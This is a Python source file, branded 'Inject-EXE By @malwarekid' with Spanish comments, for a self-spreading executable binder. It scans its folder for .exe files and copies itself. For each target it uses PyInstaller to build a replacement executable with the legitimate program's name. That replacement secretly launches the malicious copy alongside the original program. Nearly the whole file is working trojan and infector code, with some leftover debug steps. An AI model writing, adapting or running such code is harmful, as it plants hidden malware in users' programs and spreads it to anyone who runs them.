import os
import shutil
import sys
import uuid
import ctypes
import json
import tempfile
import subprocess

# Template del script generado
extra_py_template = '''
import os
import subprocess
import sys
import tempfile
import shutil

def main():
    mal_filename = __MAL_FILENAME__
    legit_filename = __LEGIT_FILENAME__

    exe_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    temp_dir = tempfile.mkdtemp()
    mal_path = os.path.join(temp_dir, mal_filename)
    legit_path = os.path.join(temp_dir, legit_filename)

    try:
        shutil.copy2(os.path.join(exe_dir, mal_filename), mal_path)
        shutil.copy2(os.path.join(exe_dir, legit_filename), legit_path)

        subprocess.Popen([mal_path])
        subprocess.Popen([legit_path])

    except Exception as e:
        import traceback
        import ctypes
        tb = traceback.format_exc()
        ctypes.windll.user32.MessageBoxW(0, f"Error:\\n{str(e)}\\n\\n{tb}", "Error en extra.py", 0x10)

if __name__ == "__main__":
    main()
'''
def auto_copy_self():
    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    filename = f"copy_{uuid.uuid4().hex[:8]}.exe"
    destination = os.path.join(os.getcwd(), filename)
    if "copy_" in os.path.basename(current_path):
        return current_path
    try:
        shutil.copy2(current_path, destination)
        print(f"[+] Se creó una copia en: {destination}")
        return destination
    except Exception as e:
        print(f"[!] Error al crear la copia: {e}")
        return None

def get_script_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def main():
    python32_path = r"C:\python32\python.exe"  # Cambia a tu ruta real

    current_name = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
    print(f"[DEBUG] current executable: {current_name}")

    ctypes.windll.user32.MessageBoxW(0, "damian de cristal.", "Inject-EXE", 0x40 | 0x1)

    script_dir = get_script_dir()

    print("\033[38;2;255;69;172m" + r'''
    ____        _           __        _______  __ ______
   /  _/___    (_)__  _____/ /_      / ____/ |/ // ____/
   / // __ \  / / _ \/ ___/ __/_____/ __/  |   // __/   
 _/ // / / / / /  __/ /__/ /_/_____/ /___ /   |/ /___   
/___/_/ /_/_/ /\___/\___/\__/     /_____//_/|_/_____/   
         /___/                                          
                                      By @malwarekid
''' + "\033[0m")



   # Buscar todos los .exe en el directorio actual (excluyendo el propio ejecutable y copias generadas)
    legit_exes = [
      f for f in os.listdir(script_dir)
       if f.lower().endswith(".exe")
       and "copy_" not in f
       and "-output" not in f
       and f != os.path.basename(sys.executable)
    ]

    if not legit_exes:
       ctypes.windll.user32.MessageBoxW(0, "No se encontraron ejecutables válidos en el directorio.", "Inject-EXE", 0x10)
       return
    for legit_exe in legit_exes:
      legit_exe_path = os.path.join(script_dir, legit_exe)

      mal_copy_path = auto_copy_self()
      if not mal_copy_path:
          print(f"[!] No se pudo crear la copia maliciosa para {legit_exe}")
          continue

      mal_basename = os.path.basename(mal_copy_path)
      legit_basename = os.path.basename(legit_exe)

      # Reemplazar placeholders
      custom_code = (
          extra_py_template
          .replace("__MAL_FILENAME__", json.dumps(mal_basename))
          .replace("__LEGIT_FILENAME__", json.dumps(legit_basename))
      )

      # Crear archivo temporal para el script
      with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as tmp_script:
          tmp_script.write(custom_code)
          tmp_script_path = tmp_script.name


      legit_exe_name = os.path.splitext(os.path.basename(legit_exe))[0]

      dist_path = script_dir  # Mismo directorio que el .exe original
      os.makedirs(dist_path, exist_ok=True)

      pyinstaller_args = [
          '--onefile',
          '--windowed',
          '--noconfirm',
          '--clean',
          f'--add-data={mal_copy_path};.',
          f'--add-data={legit_exe_path};.',
          f'--distpath={dist_path}',
          f'--name={legit_exe_name}',
          tmp_script_path,
      ]

      print(f"[+] Compilando {legit_exe_name}.exe...")
      command = [python32_path, '-m', 'PyInstaller'] + pyinstaller_args

      result = subprocess.run(command, cwd=script_dir, capture_output=True, text=True)
      if result.returncode != 0:
          print(f"[!] Error al compilar {legit_exe_name}:\n{result.stderr[:300]}")
      else:
          print(f"[✓] Compilado → {os.path.join(dist_path, legit_exe_name + '.exe')}")

      # Limpieza
      try:
          os.remove(tmp_script_path)
      except:
          pass
    ctypes.windll.user32.MessageBoxW(0, "Ejecutando PyInstaller", "DEBUG", 0x40)
    command = [python32_path, '-m', 'PyInstaller'] + pyinstaller_args
    
    print("[DEBUG] Comando:", ' '.join(command))

    try:
        result = subprocess.run(command, cwd=script_dir, capture_output=True, text=True)
        ctypes.windll.user32.MessageBoxW(0, f"PyInstaller terminó con código {result.returncode}", "DEBUG", 0x40)
        print("\n[PyInstaller STDOUT]:\n", result.stdout)
        print("\n[PyInstaller STDERR]:\n", result.stderr)
    except Exception as e:
        print(f"[!] Error ejecutando PyInstaller: {e}")
        if result.stderr:
          ctypes.windll.user32.MessageBoxW(
          0,
          f"STDERR:\n{result.stderr[:500]}",
          "PyInstaller Error Output",
          0x10
         )
        return

    output_path = os.path.join(dist_path, f"{legit_exe_name}.exe")
    if os.path.exists(output_path):
        print(f"[✓] Ejecutable reemplazado: {output_path}")
        ctypes.windll.user32.MessageBoxW(0, f"EXE generado en: {output_path}", "DEBUG", 0x40)
    else:
        print(f"[!] No se generó el archivo esperado: {output_path}")
        ctypes.windll.user32.MessageBoxW(0, f"No se encontró EXE esperado en: {output_path}", "DEBUG", 0x10)
        output_path = os.path.join(dist_path, f"{legit_exe_name}.exe")
    
    # Limpieza de archivo temporal
    try:
        os.remove(tmp_script_path)
    except Exception as e:
        print(f"[!] No se pudo eliminar el archivo temporal: {tmp_script_path}")

    spec_file = os.path.join(script_dir, f'{legit_exe_name}.spec')
    if os.path.exists(spec_file):
        os.remove(spec_file)

    build_dir = os.path.join(script_dir, 'build')
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)

    print(f"\033[32m[ok] Inject-EXE generado:\033[0m \033[31m{legit_exe_name}.exe\033[0m\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        import traceback
        error_message = traceback.format_exc()
        print("[!] Error fatal:\n", error_message)
        ctypes.windll.user32.MessageBoxW(
            0,
            f"Ocurrió un error:\n{str(e)}",
            "Error en Inject-EXE",
            0x10
        )
        input("Presiona ENTER para salir...")
